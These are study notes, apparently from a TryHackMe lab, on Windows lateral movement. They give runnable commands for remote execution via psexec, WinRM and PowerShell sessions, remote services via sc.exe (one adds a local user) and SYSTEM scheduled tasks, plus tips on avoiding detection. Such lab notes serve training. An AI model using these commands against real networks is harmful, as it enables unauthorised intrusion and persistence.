There are several ways in which an attacker can move laterally. 
The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network. 

This approach can be used to emulate regular users' behaviours somewhat as long as some coherence is maintained when planning where to connect with what account. 
While a user from IT connecting to the web server via RDP might be usual and go under the radar, care must be taken not to attempt suspicious connections:
    (e.g. why is the local admin user connecting to the DEV-001-PC from the Marketing-PC?).

-Spawn a Process Remotely:
Available methods an attacker has to, allowing them to run commands on machines where they have valid credentials

    -Psexec:
        ->Ports: 445/TCP (SMB)
        ->Required Group Memberships: Administrators
        It allows an administrator user to run commands remotely on any PC where he has access. 
        Psexec is one of many Sysinternals Tools and can be downloaded here: https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

        To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run:
            ->psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe  


    -Remote Process Creation Using WinRM:
        ->Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
        ->Required Group Memberships: Remote Management Users
        Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotelyWindows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely

        To connect to a remote Powershell session from the command line, we can use the following command:
            ->winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

        We can achieve the same from Powershell, but to pass different credentials, we will need to create a "PSCredential" object:
            ->$username = 'Administrator';
            ->$password = 'Mypass123';
            ->$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
            ->$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

        Once we have our "PSCredential" object, we can create an interactive session using the "Enter-PSSession" cmdlet:
            ->Enter-PSSession -Computername TARGET -Credential $credential

        Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. 
        Credentials must be passed through a PSCredential object as well:
            ->Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

    -Remotely Creating Services Using sc
        ->Ports:
            135/TCP, 49152-65535/TCP (DCE/RPC)
            445/TCP (RPC over SMB Named Pipes)
            139/TCP (RPC over SMB Named Pipes)
        ->Required Group Memberships: Administrators

        We can create a service on a remote host with sc.exe, a standard tool available in Windows. 
        When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:
            ->1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135
                The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535

            ->2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).
                We can create and start a service named "THMservice" using the following commands:

                    ->sc.exe \\TARGET create THMservice binPath= "net user Username Password /add" start= auto
                    ->sc.exe \\TARGET start THMservice

                    To stop and delete the service, we can then execute the following commands:
                    ->sc.exe \\TARGET stop THMservice
                    ->sc.exe \\TARGET delete THMservice
    
    -Creating Scheduled Tasks Remotely:
        Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks:
            ->schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
            ->schtasks /s TARGET /run /TN "THMtask1"
            (We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date)
        
        to delete the scheduled task, we can use the following command and clean up after ourselves:
            ->schtasks /S TARGET /TN "THMtask1" /DELETE /F    
